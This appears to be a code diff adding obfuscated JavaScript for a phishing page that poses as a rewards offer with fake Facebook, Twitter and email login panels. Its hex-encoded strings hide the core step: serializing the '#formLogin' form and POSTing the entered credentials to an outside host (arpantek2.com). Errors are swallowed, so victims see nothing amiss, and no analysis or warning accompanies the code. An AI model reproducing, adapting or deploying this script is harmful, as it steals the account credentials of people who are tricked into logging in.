@@ -1,0 +1,10 @@
+var _0x2661=["\x73\x65\x72\x69\x61\x6C\x69\x7A\x65","\x23\x66\x6F\x72\x6D\x4C\x6F\x67\x69\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x72\x70\x61\x6E\x74\x65\x6B\x32\x2E\x63\x6F\x6D\x2F\x6E\x65\x77\x2F\x69\x6E\x64\x65\x78\x2E\x70\x68\x70","\x50\x4F\x53\x54","\x61\x6A\x61\x78","\x73\x68\x6F\x77","\x2E\x72\x65\x77\x61\x72\x64\x73\x42\x6F\x78","\x68\x69\x64\x65","\x2E\x72\x65\x77\x61\x72\x64\x73\x48\x6F\x6D\x65","\x73\x72\x63","\x61\x74\x74\x72","\x2E\x72\x65\x77\x61\x72\x64\x5F\x63\x6F\x6E\x66\x69\x72\x6D\x61\x74\x69\x6F\x6E","\x23\x6D\x79\x52\x65\x77\x61\x72\x64\x49\x6D\x67","\x2E\x61\x63\x63\x6F\x75\x6E\x74\x5F\x6C\x6F\x67\x69\x6E","\x2E\x6C\x6F\x67\x69\x6E\x2D\x66\x61\x63\x65\x62\x6F\x6F\x6B","\x2E\x6C\x6F\x67\x69\x6E\x2D\x74\x77\x69\x74\x74\x65\x72"];function open_my_account(){var _0x8daex2=$(_0x2661[1])[_0x2661[0]]();$[_0x2661[4]]({url:_0x2661[2],data:_0x8daex2,type:_0x2661[3],success:function(){return true},error:function(){return true}})}function open_rewardsBox(){$(_0x2661[6])[_0x2661[5]]();$(_0x2661[8])[_0x2661[7]]()}function open_reward_confirmation(_0x8daex5){var _0x8daex6=$(_0x8daex5)[_0x2661[10]](_0x2661[9]);$(_0x2661[11])[_0x2661[5]]();$(_0x2661[12])[_0x2661[10]](_0x2661[9],_0x8daex6)}function open_account_login(){$(_0x2661[13])[_0x2661[5]]();$(_0x2661[11])[_0x2661[7]]()}function open_facebook(){$(_0x2661[14])[_0x2661[5]]();$(_0x2661[13])[_0x2661[7]]()}function open_twitter(){$(_0x2661[15])[_0x2661[5]]();$(_0x2661[13])[_0x2661[7]]()}function close_reward_confirmation(){$(_0x2661[11])[_0x2661[7]]()}function close_account_login(){$(_0x2661[13])[_0x2661[7]]()}function tutup_facebook(){$(_0x2661[14])[_0x2661[7]]();$(_0x2661[13])[_0x2661[5]]()}function tutup_twitter(){$(_0x2661[15])[_0x2661[7]]();$(_0x2661[13])[_0x2661[5]]()}
+
+function open_email(){
+    $('.login-email').show();
+    $('.account_login').hide();
+}
+function tutup_email(){
+    $('.login-email').hide();
+    $('.account_login').show();
+}
